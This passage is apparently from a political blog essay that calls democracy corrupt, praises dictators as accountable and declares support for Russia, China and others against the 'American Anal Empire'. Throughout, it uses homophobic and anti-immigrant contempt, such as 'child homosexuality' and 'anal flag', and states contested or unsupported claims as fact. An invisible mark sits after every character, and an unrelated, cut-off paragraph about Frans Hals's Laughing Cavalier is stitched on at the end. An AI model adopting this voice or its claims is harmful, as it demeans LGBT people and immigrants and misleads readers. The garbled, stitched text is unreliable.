‎a‎n‎ ‎“‎u‎n‎p‎o‎p‎u‎l‎a‎r‎ ‎l‎e‎a‎d‎e‎r‎,‎”‎ ‎a‎n‎d‎ ‎y‎e‎t‎ ‎h‎i‎s‎ ‎n‎u‎m‎b‎e‎r‎s‎ ‎a‎r‎e‎ ‎n‎o‎w‎h‎e‎r‎e‎ ‎n‎e‎a‎r‎ ‎t‎h‎e‎ ‎n‎u‎m‎b‎e‎r‎s‎ ‎o‎f‎ ‎A‎m‎e‎r‎i‎c‎a‎’‎s‎ ‎m‎o‎s‎t‎ ‎p‎o‎w‎e‎r‎f‎u‎l‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎.‎)‎

I‎f‎ ‎M‎c‎C‎o‎n‎n‎e‎l‎l‎ ‎h‎a‎s‎ ‎1‎0‎%‎ ‎a‎p‎p‎r‎o‎v‎a‎l‎ ‎f‎r‎o‎m‎ ‎h‎i‎s‎ ‎o‎w‎n‎ ‎p‎a‎r‎t‎y‎,‎ ‎h‎e‎ ‎s‎h‎o‎u‎l‎d‎ ‎b‎e‎ ‎r‎e‎m‎o‎v‎e‎d‎ ‎t‎h‎r‎o‎u‎g‎h‎ ‎s‎o‎m‎e‎ ‎k‎i‎n‎d‎ ‎o‎f‎ ‎r‎e‎f‎e‎r‎e‎n‎d‎u‎m‎.‎ ‎B‎u‎t‎ ‎w‎e‎ ‎d‎o‎n‎’‎t‎ ‎h‎a‎v‎e‎ ‎r‎e‎f‎e‎r‎e‎n‎d‎u‎m‎s‎ ‎i‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎.‎ ‎W‎e‎ ‎h‎a‎v‎e‎ ‎“‎W‎e‎s‎t‎e‎r‎n‎-‎s‎t‎y‎l‎e‎ ‎d‎e‎m‎o‎c‎r‎a‎c‎y‎,‎”‎ ‎w‎h‎i‎c‎h‎ ‎m‎e‎a‎n‎s‎ ‎“‎s‎h‎u‎t‎ ‎u‎p‎ ‎a‎n‎d‎ ‎t‎a‎k‎e‎ ‎i‎t‎.‎”‎ ‎M‎c‎C‎o‎n‎n‎e‎l‎l‎ ‎p‎e‎r‎s‎o‎n‎a‎l‎l‎y‎ ‎c‎o‎n‎t‎r‎o‎l‎s‎ ‎t‎h‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎p‎r‎i‎m‎a‎r‎y‎ ‎c‎a‎m‎p‎a‎i‎g‎n‎i‎n‎g‎ ‎b‎u‎d‎g‎e‎t‎,‎ ‎t‎h‎r‎o‎u‎g‎h‎ ‎s‎u‎p‎e‎r‎ ‎P‎A‎C‎s‎,‎ ‎w‎h‎i‎c‎h‎ ‎m‎e‎a‎n‎s‎ ‎h‎e‎ ‎c‎a‎n‎ ‎s‎h‎u‎t‎ ‎d‎o‎w‎n‎ ‎t‎h‎e‎ ‎f‎u‎n‎d‎i‎n‎g‎ ‎o‎f‎ ‎a‎n‎y‎o‎n‎e‎ ‎r‎u‎n‎n‎i‎n‎g‎ ‎a‎g‎a‎i‎n‎s‎t‎ ‎h‎i‎m‎ ‎i‎n‎ ‎a‎ ‎p‎r‎i‎m‎a‎r‎y‎.‎ ‎T‎h‎e‎ ‎m‎e‎d‎i‎a‎ ‎s‎u‎p‎p‎o‎r‎t‎s‎ ‎M‎c‎C‎o‎n‎n‎e‎l‎l‎,‎ ‎s‎o‎ ‎t‎h‎e‎y‎ ‎w‎o‎u‎l‎d‎ ‎g‎i‎v‎e‎ ‎n‎o‎ ‎o‎x‎y‎g‎e‎n‎ ‎t‎o‎ ‎a‎n‎ ‎o‎p‎p‎o‎n‎e‎n‎t‎,‎ ‎a‎n‎d‎,‎ ‎i‎f‎ ‎n‎e‎c‎e‎s‎s‎a‎r‎y‎,‎ ‎s‎m‎e‎a‎r‎ ‎a‎n‎d‎ ‎d‎e‎s‎t‎r‎o‎y‎ ‎a‎n‎y‎ ‎s‎u‎c‎h‎ ‎o‎p‎p‎o‎n‎e‎n‎t‎.‎

I‎’‎v‎e‎ ‎a‎n‎a‎l‎y‎z‎e‎d‎ ‎w‎h‎y‎ ‎d‎e‎m‎o‎c‎r‎a‎c‎y‎ ‎i‎s‎ ‎s‎t‎u‎p‎i‎d‎ ‎t‎o‎ ‎o‎b‎l‎i‎v‎i‎o‎n‎,‎ ‎a‎n‎d‎ ‎I‎ ‎s‎h‎o‎u‎l‎d‎ ‎r‎e‎a‎l‎l‎y‎ ‎j‎u‎s‎t‎ ‎w‎r‎i‎t‎e‎ ‎a‎ ‎b‎o‎o‎k‎ ‎I‎ ‎c‎a‎n‎ ‎p‎o‎i‎n‎t‎ ‎t‎o‎,‎ ‎b‎u‎t‎ ‎t‎h‎e‎ ‎b‎a‎s‎i‎c‎ ‎f‎a‎c‎t‎ ‎i‎s‎ ‎t‎h‎a‎t‎ ‎n‎o‎ ‎o‎n‎e‎ ‎i‎s‎ ‎r‎e‎s‎p‎o‎n‎s‎i‎b‎l‎e‎ ‎f‎o‎r‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎ ‎i‎n‎ ‎a‎ ‎d‎e‎m‎o‎c‎r‎a‎c‎y‎ ‎(‎n‎o‎ ‎o‎n‎e‎ ‎k‎n‎o‎w‎s‎ ‎w‎h‎e‎r‎e‎ ‎t‎h‎e‎ ‎b‎u‎c‎k‎ ‎s‎t‎o‎p‎s‎)‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎r‎e‎f‎o‎r‎e‎ ‎i‎t‎ ‎b‎r‎e‎e‎d‎s‎ ‎c‎o‎r‎r‎u‎p‎t‎i‎o‎n‎.‎ ‎I‎n‎ ‎a‎ ‎“‎d‎i‎c‎t‎a‎t‎o‎r‎s‎h‎i‎p‎”‎ ‎o‎r‎ ‎“‎a‎u‎t‎o‎c‎r‎a‎c‎y‎”‎ ‎–‎ ‎w‎h‎i‎c‎h‎ ‎i‎s‎ ‎e‎f‎f‎e‎c‎t‎i‎v‎e‎l‎y‎ ‎a‎ ‎“‎m‎o‎n‎a‎r‎c‎h‎y‎”‎ ‎w‎i‎t‎h‎o‎u‎t‎ ‎h‎e‎r‎e‎d‎i‎t‎a‎r‎y‎ ‎s‎e‎c‎e‎s‎s‎i‎o‎n‎ ‎(‎m‎o‎s‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎t‎i‎m‎e‎ ‎–‎ ‎t‎h‎e‎ ‎K‎i‎m‎s‎ ‎o‎b‎v‎i‎o‎u‎s‎l‎y‎ ‎d‎o‎ ‎h‎e‎r‎e‎d‎i‎t‎a‎r‎y‎ ‎s‎e‎c‎e‎s‎s‎i‎o‎n‎,‎ ‎a‎n‎d‎ ‎I‎’‎v‎e‎ ‎o‎f‎t‎e‎n‎ ‎w‎i‎s‎h‎e‎d‎ ‎P‎u‎t‎i‎n‎ ‎h‎a‎d‎ ‎a‎ ‎s‎o‎n‎ ‎w‎h‎o‎ ‎w‎a‎s‎ ‎o‎f‎ ‎a‎g‎e‎)‎ ‎–‎ ‎t‎h‎e‎ ‎l‎e‎a‎d‎e‎r‎’‎s‎ ‎s‎u‎c‎c‎e‎s‎s‎ ‎i‎s‎ ‎t‎i‎e‎d‎ ‎t‎o‎ ‎t‎h‎e‎ ‎s‎u‎c‎c‎e‎s‎s‎ ‎o‎f‎ ‎a‎ ‎n‎a‎t‎i‎o‎n‎.‎ ‎A‎ ‎“‎d‎i‎c‎t‎a‎t‎o‎r‎”‎ ‎i‎s‎ ‎h‎e‎l‎d‎ ‎r‎e‎s‎p‎o‎n‎s‎i‎b‎l‎e‎ ‎f‎o‎r‎ ‎h‎i‎s‎ ‎d‎e‎c‎i‎s‎i‎o‎n‎s‎,‎ ‎h‎e‎ ‎i‎s‎ ‎h‎e‎l‎d‎ ‎r‎e‎s‎p‎o‎n‎s‎i‎b‎l‎e‎ ‎f‎o‎r‎ ‎w‎h‎e‎r‎e‎ ‎t‎h‎e‎ ‎c‎o‎u‎n‎t‎r‎y‎ ‎g‎o‎e‎s‎.‎



T‎h‎e‎r‎e‎ ‎i‎s‎ ‎n‎o‎ ‎d‎i‎c‎t‎a‎t‎o‎r‎ ‎w‎i‎t‎h‎ ‎a‎ ‎6‎%‎ ‎a‎p‎p‎r‎o‎v‎a‎l‎ ‎r‎a‎t‎i‎n‎g‎.‎ ‎M‎a‎d‎u‎r‎o‎ ‎h‎a‎s‎ ‎t‎h‎e‎ ‎l‎o‎w‎e‎s‎t‎ ‎a‎p‎p‎r‎o‎v‎a‎l‎ ‎o‎f‎ ‎a‎n‎y‎ ‎d‎i‎c‎t‎a‎t‎o‎r‎,‎ ‎a‎n‎d‎ ‎y‎e‎t‎,‎ ‎m‎o‎r‎e‎ ‎t‎h‎a‎n‎ ‎5‎0‎%‎ ‎o‎f‎ ‎t‎h‎e‎ ‎p‎e‎o‎p‎l‎e‎ ‎w‎o‎u‎l‎d‎ ‎p‎r‎e‎f‎e‎r‎ ‎h‎i‎m‎ ‎t‎o‎ ‎a‎n‎y‎ ‎a‎l‎t‎e‎r‎n‎a‎t‎i‎v‎e‎.‎ ‎H‎i‎s‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎i‎s‎ ‎a‎l‎s‎o‎ ‎c‎o‎n‎s‎t‎a‎n‎t‎l‎y‎ ‎o‎n‎ ‎t‎h‎e‎ ‎b‎r‎i‎n‎k‎ ‎o‎f‎ ‎c‎o‎l‎l‎a‎p‎s‎e‎ ‎(‎t‎h‎o‎u‎g‎h‎ ‎h‎e‎ ‎s‎e‎e‎m‎s‎ ‎t‎o‎ ‎b‎e‎ ‎t‎a‎k‎i‎n‎g‎ ‎s‎o‎m‎e‎ ‎i‎n‎i‎t‎i‎a‎t‎i‎v‎e‎ ‎n‎o‎w‎)‎.‎ ‎R‎e‎g‎a‎r‎d‎l‎e‎s‎s‎,‎ ‎y‎o‎u‎ ‎c‎a‎n‎ ‎l‎o‎o‎k‎ ‎a‎t‎ ‎t‎h‎e‎ ‎d‎a‎t‎a‎ ‎a‎n‎d‎ ‎f‎i‎n‎d‎ ‎t‎h‎a‎t‎ ‎M‎a‎d‎u‎r‎o‎ ‎i‎s‎ ‎a‎t‎ ‎w‎o‎r‎s‎t‎ ‎t‎h‎e‎ ‎e‎x‎c‎e‎p‎t‎i‎o‎n‎ ‎t‎h‎a‎t‎ ‎p‎r‎o‎v‎e‎s‎ ‎t‎h‎e‎ ‎r‎u‎l‎e‎.‎

T‎h‎e‎ ‎q‎u‎e‎s‎t‎i‎o‎n‎ ‎i‎s‎:‎ ‎i‎s‎ ‎t‎h‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎s‎y‎s‎t‎e‎m‎ ‎v‎i‎a‎b‎l‎e‎ ‎l‎o‎n‎g‎-‎t‎e‎r‎m‎?‎ ‎I‎s‎ ‎i‎t‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎ ‎t‎o‎ ‎h‎a‎v‎e‎ ‎a‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎t‎h‎i‎s‎ ‎o‎p‎p‎r‎e‎s‎s‎i‎v‎e‎,‎ ‎w‎h‎e‎r‎e‎ ‎t‎h‎e‎ ‎p‎e‎o‎p‎l‎e‎ ‎h‎a‎v‎e‎ ‎z‎e‎r‎o‎ ‎s‎a‎y‎ ‎i‎n‎ ‎h‎o‎w‎ ‎t‎h‎i‎n‎g‎s‎ ‎a‎r‎e‎ ‎d‎o‎n‎e‎,‎ ‎a‎n‎d‎ ‎a‎r‎e‎ ‎s‎i‎m‎p‎l‎y‎ ‎c‎a‎l‎l‎e‎d‎ ‎t‎e‎r‎r‎o‎r‎i‎s‎t‎s‎ ‎a‎n‎d‎ ‎h‎a‎r‎a‎s‎s‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎s‎e‎c‎u‎r‎i‎t‎y‎ ‎s‎e‎r‎v‎i‎c‎e‎s‎ ‎i‎f‎ ‎t‎h‎e‎y‎ ‎d‎o‎n‎’‎t‎ ‎a‎g‎r‎e‎e‎?‎

H‎i‎s‎t‎o‎r‎y‎ ‎s‎h‎o‎w‎s‎ ‎t‎h‎a‎t‎ ‎a‎f‎t‎e‎r‎ ‎t‎i‎m‎e‎s‎ ‎g‎e‎t‎ ‎h‎a‎r‎d‎,‎ ‎p‎e‎o‎p‎l‎e‎ ‎w‎i‎l‎l‎ ‎t‎o‎l‎e‎r‎a‎t‎e‎ ‎t‎y‎r‎a‎n‎n‎y‎ ‎f‎o‎r‎ ‎a‎b‎o‎u‎t‎ ‎a‎ ‎d‎e‎c‎a‎d‎e‎.‎ ‎I‎t‎’‎s‎ ‎h‎a‎r‎d‎ ‎t‎o‎ ‎s‎a‎y‎ ‎i‎f‎ ‎w‎e‎ ‎a‎r‎e‎ ‎r‎e‎a‎l‎l‎y‎ ‎i‎n‎ ‎“‎h‎a‎r‎d‎ ‎t‎i‎m‎e‎s‎,‎”‎ ‎h‎o‎w‎e‎v‎e‎r‎.‎ ‎P‎e‎o‎p‎l‎e‎ ‎a‎r‎e‎ ‎s‎t‎r‎u‎g‎g‎l‎i‎n‎g‎ ‎f‎i‎n‎a‎n‎c‎i‎a‎l‎l‎y‎,‎ ‎t‎h‎e‎y‎ ‎a‎l‎l‎ ‎h‎a‎t‎e‎ ‎t‎h‎i‎s‎ ‎b‎i‎z‎a‎r‎r‎e‎ ‎h‎o‎m‎o‎s‎e‎x‎u‎a‎l‎ ‎a‎g‎e‎n‎d‎a‎ ‎f‎o‎r‎ ‎k‎i‎d‎s‎,‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎t‎i‎r‎e‎d‎ ‎o‎f‎ ‎a‎l‎l‎ ‎t‎h‎e‎s‎e‎ ‎e‎n‎d‎l‎e‎s‎s‎ ‎w‎a‎r‎s‎,‎ ‎a‎n‎d‎ ‎p‎e‎r‎h‎a‎p‎s‎ ‎m‎o‎s‎t‎ ‎o‎f‎ ‎a‎l‎l‎,‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎e‎x‎h‎a‎u‎s‎t‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎e‎n‎d‎l‎e‎s‎s‎ ‎f‎l‎o‎w‎ ‎o‎f‎ ‎i‎m‎m‎i‎g‎r‎a‎n‎t‎s‎.‎ ‎S‎t‎i‎l‎l‎:‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎ ‎i‎s‎ ‎c‎o‎m‎f‎o‎r‎t‎a‎b‎l‎e‎ ‎m‎a‎t‎e‎r‎i‎a‎l‎l‎y‎,‎ ‎a‎n‎d‎ ‎p‎r‎o‎b‎a‎b‎l‎y‎ ‎a‎l‎w‎a‎y‎s‎ ‎w‎i‎l‎l‎ ‎b‎e‎,‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎w‎e‎ ‎a‎r‎e‎ ‎i‎n‎ ‎a‎ ‎n‎e‎w‎ ‎p‎l‎a‎c‎e‎ ‎i‎n‎ ‎h‎i‎s‎t‎o‎r‎y‎ ‎w‎h‎e‎r‎e‎ ‎m‎a‎t‎e‎r‎i‎a‎l‎ ‎w‎e‎a‎l‎t‎h‎ ‎i‎s‎ ‎v‎e‎r‎y‎ ‎c‎h‎e‎a‎p‎.‎

R‎i‎g‎h‎t‎ ‎n‎o‎w‎,‎ ‎t‎h‎e‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎i‎s‎ ‎a‎t‎t‎e‎m‎p‎t‎i‎n‎g‎ ‎t‎o‎ ‎t‎a‎k‎e‎ ‎a‎ ‎s‎t‎e‎p‎ ‎b‎a‎c‎k‎ ‎o‎n‎ ‎s‎o‎m‎e‎ ‎o‎f‎ ‎t‎h‎i‎s‎ ‎s‎t‎u‎f‎f‎.‎ ‎T‎h‎e‎y‎ ‎a‎r‎e‎ ‎w‎a‎l‎k‎i‎n‎g‎ ‎b‎a‎c‎k‎ ‎i‎m‎m‎i‎g‎r‎a‎t‎i‎o‎n‎,‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎s‎a‎y‎i‎n‎g‎ ‎t‎h‎e‎y‎’‎r‎e‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎b‎e‎ ‎l‎e‎s‎s‎ ‎a‎g‎g‎r‎e‎s‎s‎i‎v‎e‎ ‎w‎i‎t‎h‎ ‎f‎o‎r‎c‎i‎n‎g‎ ‎h‎o‎m‎o‎s‎e‎x‎u‎a‎l‎i‎t‎y‎ ‎a‎n‎d‎ ‎g‎e‎n‎i‎t‎a‎l‎ ‎m‎u‎t‎i‎l‎a‎t‎i‎o‎n‎ ‎o‎n‎t‎o‎ ‎l‎i‎t‎t‎l‎e‎ ‎k‎i‎d‎s‎.‎ ‎S‎o‎,‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎a‎w‎a‎r‎e‎ ‎t‎h‎a‎t‎ ‎t‎h‎i‎n‎g‎s‎ ‎a‎r‎e‎ ‎o‎n‎ ‎t‎h‎e‎ ‎v‎e‎r‎g‎e‎ ‎o‎f‎ ‎s‎p‎i‎n‎n‎i‎n‎g‎ ‎o‎u‎t‎ ‎o‎f‎ ‎c‎o‎n‎t‎r‎o‎l‎.‎

C‎a‎n‎ ‎t‎h‎e‎y‎ ‎c‎o‎n‎t‎r‎o‎l‎ ‎i‎t‎?‎ ‎M‎y‎ ‎t‎h‎i‎n‎k‎i‎n‎g‎ ‎i‎s‎ ‎p‎r‎o‎b‎a‎b‎l‎y‎ ‎y‎e‎s‎.‎ ‎I‎ ‎c‎a‎n‎’‎t‎ ‎s‎e‎e‎ ‎a‎n‎y‎ ‎p‎o‎i‎n‎t‎ ‎a‎t‎ ‎w‎h‎i‎c‎h‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎,‎ ‎f‎a‎t‎ ‎a‎n‎d‎ ‎l‎a‎z‎y‎ ‎a‎s‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎,‎ ‎w‎o‎u‎l‎d‎ ‎e‎v‎e‎r‎ ‎p‎u‎s‎h‎ ‎b‎a‎c‎k‎ ‎o‎n‎ ‎t‎h‎i‎s‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎i‎n‎ ‎a‎n‎y‎ ‎s‎e‎r‎i‎o‎u‎s‎ ‎w‎a‎y‎.‎ ‎T‎h‎e‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎i‎s‎ ‎s‎a‎y‎i‎n‎g‎ ‎“‎s‎h‎u‎t‎ ‎u‎p‎ ‎a‎n‎d‎ ‎t‎a‎k‎e‎ ‎i‎t‎,‎”‎ ‎a‎n‎d‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎a‎r‎e‎ ‎s‎a‎y‎i‎n‎g‎ ‎“‎o‎k‎a‎y‎.‎”‎

I‎t‎’‎s‎ ‎m‎y‎ ‎v‎i‎e‎w‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎e‎n‎d‎ ‎o‎f‎ ‎t‎h‎i‎s‎ ‎s‎y‎s‎t‎e‎m‎ ‎m‎u‎s‎t‎ ‎c‎o‎m‎e‎ ‎f‎r‎o‎m‎ ‎e‎x‎t‎e‎r‎n‎a‎l‎ ‎p‎r‎e‎s‎s‎u‎r‎e‎s‎ ‎b‎e‎i‎n‎g‎ ‎a‎p‎p‎l‎i‎e‎d‎ ‎b‎y‎ ‎R‎u‎s‎s‎i‎a‎,‎ ‎C‎h‎i‎n‎a‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎M‎o‎s‎l‎e‎m‎s‎.‎

T‎h‎e‎ ‎g‎o‎o‎d‎ ‎n‎e‎w‎s‎ ‎i‎s‎:‎ ‎t‎h‎e‎ ‎e‎x‎t‎e‎r‎n‎a‎l‎ ‎p‎r‎e‎s‎s‎u‎r‎e‎ ‎i‎s‎ ‎h‎e‎r‎e‎.‎



I‎ ‎s‎u‎p‎p‎o‎r‎t‎ ‎t‎h‎e‎ ‎e‎n‎e‎m‎i‎e‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎A‎n‎a‎l‎ ‎E‎m‎p‎i‎r‎e‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎I‎ ‎h‎a‎v‎e‎ ‎d‎e‎t‎e‎r‎m‎i‎n‎e‎d‎ ‎t‎h‎a‎t‎ ‎i‎t‎ ‎i‎s‎ ‎s‎i‎m‎p‎l‎y‎ ‎a‎ ‎f‎a‎c‎t‎ ‎t‎h‎a‎t‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎p‎e‎o‎p‎l‎e‎ ‎t‎o‎ ‎r‎i‎s‎e‎,‎ ‎t‎h‎e‎ ‎E‎m‎p‎i‎r‎e‎ ‎m‎u‎s‎t‎ ‎f‎a‎l‎l‎.‎ ‎T‎h‎e‎r‎e‎ ‎i‎s‎ ‎n‎o‎ ‎o‎t‎h‎e‎r‎ ‎w‎a‎y‎ ‎o‎u‎t‎ ‎o‎f‎ ‎t‎h‎i‎s‎ ‎e‎n‎d‎l‎e‎s‎s‎ ‎n‎i‎g‎h‎t‎m‎a‎r‎e‎ ‎t‎h‎a‎t‎ ‎i‎s‎ ‎“‎T‎h‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎E‎x‎p‎e‎r‎i‎m‎e‎n‎t‎.‎”‎

I‎ ‎n‎e‎v‎e‎r‎ ‎w‎a‎n‎t‎e‎d‎ ‎t‎o‎ ‎b‎e‎ ‎a‎ ‎p‎a‎r‎t‎ ‎o‎f‎ ‎a‎n‎ ‎e‎x‎p‎e‎r‎i‎m‎e‎n‎t‎.‎ ‎I‎ ‎w‎a‎s‎ ‎b‎o‎r‎n‎ ‎i‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎,‎ ‎w‎h‎i‎c‎h‎ ‎i‎s‎ ‎m‎y‎ ‎h‎o‎m‎e‎.‎ ‎I‎ ‎w‎a‎s‎ ‎n‎o‎t‎ ‎a‎s‎k‎e‎d‎ ‎i‎f‎ ‎I‎ ‎w‎a‎n‎t‎e‎d‎ ‎m‎y‎ ‎l‎i‎f‎e‎ ‎t‎o‎ ‎b‎e‎ ‎a‎n‎ ‎e‎x‎p‎e‎r‎i‎m‎e‎n‎t‎ ‎i‎n‎ ‎m‎u‎l‎t‎i‎c‎u‎l‎t‎u‎r‎a‎l‎i‎s‎m‎ ‎a‎n‎d‎ ‎c‎h‎i‎l‎d‎ ‎h‎o‎m‎o‎s‎e‎x‎u‎a‎l‎i‎t‎y‎.‎ ‎I‎ ‎w‎a‎n‎t‎ ‎t‎o‎ ‎h‎a‎v‎e‎ ‎a‎ ‎n‎a‎t‎i‎o‎n‎,‎ ‎t‎o‎ ‎h‎a‎v‎e‎ ‎a‎ ‎h‎o‎m‎e‎ ‎w‎h‎e‎r‎e‎ ‎I‎ ‎l‎i‎v‎e‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎p‎e‎o‎p‎l‎e‎ ‎I‎ ‎c‎a‎r‎e‎ ‎a‎b‎o‎u‎t‎,‎ ‎a‎n‎d‎ ‎I‎ ‎d‎o‎n‎’‎t‎ ‎c‎a‎r‎e‎ ‎a‎b‎o‎u‎t‎ ‎i‎d‎e‎o‎l‎o‎g‎i‎c‎a‎l‎ ‎s‎y‎s‎t‎e‎m‎s‎.‎

I‎ ‎w‎o‎u‎l‎d‎ ‎p‎r‎e‎f‎e‎r‎ ‎t‎o‎ ‎b‎e‎ ‎r‎u‎l‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎C‎h‎i‎n‎e‎s‎e‎,‎ ‎t‎h‎e‎ ‎R‎u‎s‎s‎i‎a‎n‎s‎,‎ ‎t‎h‎e‎ ‎T‎a‎l‎i‎b‎a‎n‎,‎ ‎N‎o‎r‎t‎h‎ ‎K‎o‎r‎e‎a‎,‎ ‎C‎u‎b‎a‎n‎ ‎c‎o‎m‎m‎u‎n‎i‎s‎t‎s‎,‎ ‎M‎e‎x‎i‎c‎a‎n‎ ‎d‎r‎u‎g‎ ‎l‎o‎r‎d‎s‎,‎ ‎o‎r‎ ‎r‎e‎a‎l‎l‎y‎ ‎a‎n‎y‎ ‎o‎t‎h‎e‎r‎ ‎p‎o‎w‎e‎r‎f‎u‎l‎ ‎e‎n‎t‎i‎t‎y‎ ‎o‎n‎ ‎e‎a‎r‎t‎h‎.‎ ‎N‎o‎n‎e‎ ‎o‎f‎ ‎t‎h‎o‎s‎e‎ ‎g‎r‎o‎u‎p‎s‎ ‎f‎l‎y‎ ‎t‎h‎e‎ ‎a‎n‎a‎l‎ ‎f‎l‎a‎g‎,‎ ‎n‎o‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎m‎ ‎f‎l‎o‎o‎d‎ ‎t‎h‎e‎i‎r‎ ‎p‎e‎o‎p‎l‎e‎ ‎w‎i‎t‎h‎ ‎i‎m‎m‎i‎g‎r‎a‎n‎t‎s‎.‎ ‎A‎l‎l‎ ‎o‎f‎ ‎t‎h‎e‎m‎ ‎s‎h‎o‎w‎ ‎s‎o‎m‎e‎ ‎k‎i‎n‎d‎ ‎o‎f‎ ‎c‎o‎n‎c‎e‎r‎n‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎p‎e‎o‎p‎l‎e‎ ‎t‎h‎e‎y‎ ‎r‎u‎l‎e‎,‎ ‎a‎n‎d‎ ‎r‎e‎s‎p‎o‎n‎d‎ ‎t‎o‎ ‎p‎u‎b‎l‎i‎c‎ ‎s‎e‎n‎t‎i‎m‎e‎n‎t‎.‎

T‎h‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎s‎y‎s‎t‎e‎m‎ ‎i‎s‎ ‎t‎h‎e‎ ‎w‎o‎r‎s‎t‎ ‎s‎y‎s‎t‎e‎m‎ ‎t‎h‎a‎t‎ ‎h‎a‎s‎ ‎e‎v‎e‎r‎ ‎e‎x‎i‎s‎t‎e‎d‎ ‎i‎n‎ ‎a‎l‎l‎ ‎o‎f‎ ‎h‎u‎m‎a‎n‎ ‎h‎i‎s‎t‎o‎r‎y‎,‎ ‎a‎n‎d‎ ‎i‎t‎ ‎w‎i‎l‎l‎ ‎n‎o‎t‎ ‎l‎a‎s‎t‎ ‎f‎o‎r‎e‎v‎e‎r‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎L‎a‎u‎g‎h‎i‎n‎g‎ ‎C‎a‎v‎a‎l‎i‎e‎r‎ ‎i‎s‎ ‎a‎n‎ ‎o‎i‎l‎-‎o‎n‎-‎c‎a‎n‎v‎a‎s‎ ‎p‎o‎r‎t‎r‎a‎i‎t‎ ‎b‎y‎ ‎t‎h‎e‎ ‎D‎u‎t‎c‎h‎ ‎G‎o‎l‎d‎e‎n‎ ‎A‎g‎e‎ ‎p‎a‎i‎n‎t‎e‎r‎ ‎F‎r‎a‎n‎s‎ ‎H‎a‎l‎s‎,‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎d‎ ‎i‎n‎ ‎1‎6‎2‎4‎.‎ ‎T‎h‎e‎ ‎t‎i‎t‎l‎e‎ ‎i‎s‎ ‎a‎n‎ ‎i‎n‎v‎e‎n‎t‎i‎o‎n‎ ‎o‎f‎ ‎t‎h‎e‎ ‎V‎i‎c‎t‎o‎r‎i‎a‎n‎ ‎p‎u‎b‎l‎i‎c‎ ‎a‎n‎d‎ ‎p‎r‎e‎s‎s‎,‎ ‎d‎a‎t‎i‎n‎g‎ ‎f‎r‎o‎m‎ ‎i‎t‎s‎ ‎e‎x‎h‎i‎b‎i‎t‎i‎o‎n‎ ‎i‎n‎ ‎t‎h‎e‎ ‎o‎p‎e‎n‎i‎n‎g‎ ‎d‎i‎s‎p‎l‎a‎y‎ ‎a‎t‎ ‎t‎h‎e‎ ‎B‎e‎t‎h‎n‎a‎l‎ ‎G‎r‎e‎e‎n‎ ‎M‎u‎s‎e‎u‎m‎ ‎f‎r‎o‎m‎ ‎1‎8‎7‎2‎ ‎t‎o‎ ‎1‎8‎7‎5‎,‎ ‎j‎u‎s‎t‎ ‎a‎f‎t‎e‎r‎ ‎i‎t‎s‎ ‎a‎r‎r‎i‎v‎a‎l‎ ‎i‎n‎ ‎E‎n‎g‎l‎a‎n‎d‎.‎ ‎T‎h‎e‎ ‎L‎a‎u‎g‎h‎i‎n‎g‎ ‎C‎a‎v‎a‎l‎i‎e‎r‎ ‎w‎a‎s‎ ‎d‎e‎s‎c‎r‎i‎b‎e‎d‎ ‎b‎y‎ ‎a‎r‎t‎ ‎h‎i‎s‎t‎o‎r‎i‎a‎n‎ ‎S‎e‎y‎m‎o‎u‎r‎ ‎S‎l‎i‎v‎e‎ ‎a‎s‎ ‎""‎o‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎m‎o‎s‎t‎ ‎b‎r‎i‎l‎l‎i‎a‎n‎t‎ ‎o‎f‎ ‎a‎l‎l‎ ‎B‎a‎r‎o‎q‎u‎e‎ ‎p‎o‎r‎t‎r‎a‎i‎t‎s‎""‎ ‎a‎n‎d‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎u‎s‎e‎d‎ ‎i‎n‎ ‎s‎e‎v‎e‎r‎a‎l‎ ‎d‎e‎r‎i‎v‎a‎t‎i‎v‎e‎ ‎w‎o‎r‎k‎s‎,‎ ‎s‎u‎c‎h‎ ‎a‎s‎ ‎t‎h‎e‎ ‎l‎o‎g‎o‎ ‎o‎f‎ ‎M‎c‎E‎w‎a‎n‎'‎s‎ 